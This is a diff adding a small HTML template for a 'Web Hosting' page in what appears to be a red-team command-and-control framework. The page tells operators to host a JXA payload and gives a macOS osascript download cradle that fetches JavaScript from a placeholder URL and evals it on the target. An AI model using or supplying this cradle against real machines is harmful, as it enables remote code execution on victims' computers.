@@ -1,0 +1,20 @@
+{% extends "base.html" %}
+{% block body %}
+
+<h1>
+    Web Hosting
+</h1>
+<p>
+    This will be updated with live abilities to start/stop/create different hosting services on this server.<br>
+    For now, utilize the attacks_api for this purpose.<br>
+    Once you host a JXA payload, you can use the following as a download cradle to download and run it on the target:
+    <ul>
+    <li>
+       osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('HTTP://HOST_YOUR_FILE/FILE_NAME')),$.NSUTF8StringEncoding)));"
+    </li>
+    </ul>
+</p>
+{% endblock %}
+
+{% block scripts %}
+{% endblock %}
